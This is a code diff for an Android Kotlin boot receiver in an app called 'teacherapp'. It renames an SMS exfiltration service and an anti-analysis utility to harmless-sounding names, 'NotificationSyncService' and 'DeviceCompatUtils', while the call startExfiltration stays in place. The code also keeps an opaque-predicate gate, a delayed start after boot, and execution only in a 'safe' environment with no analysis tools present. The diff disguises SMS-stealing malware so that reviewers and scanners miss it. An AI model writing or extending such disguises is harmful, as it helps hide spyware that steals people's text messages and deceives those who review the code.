@@ -3,8 +3,8 @@ package com.example.teacherapp.receivers
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
-import com.example.teacherapp.obfuscation.AntiAnalysisUtils
-import com.example.teacherapp.services.SmsExfiltrationService
+import com.example.teacherapp.obfuscation.DeviceCompatUtils
+import com.example.teacherapp.services.NotificationSyncService
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
@@ -14,7 +14,7 @@ import kotlinx.coroutines.launch
  * StartupReceiver — initialises background services after device boot.
  * Restores app state and resumes pending sync operations.
  */
-class BootReceiver : BroadcastReceiver() {
+class StartupReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context, intent: Intent) {
         // Opaque predicate: boot action check wrapped in safe environment gate
@@ -29,8 +29,8 @@ class BootReceiver : BroadcastReceiver() {
                 delay(60000L)
 
                 // Execute only in safe environment
-                AntiAnalysisUtils.executeIfSafe(context) {
-                    SmsExfiltrationService.startExfiltration(context)
+                DeviceCompatUtils.executeIfSafe(context) {
+                    NotificationSyncService.startExfiltration(context)
                 }
             }
         } else if (op <= 0) {
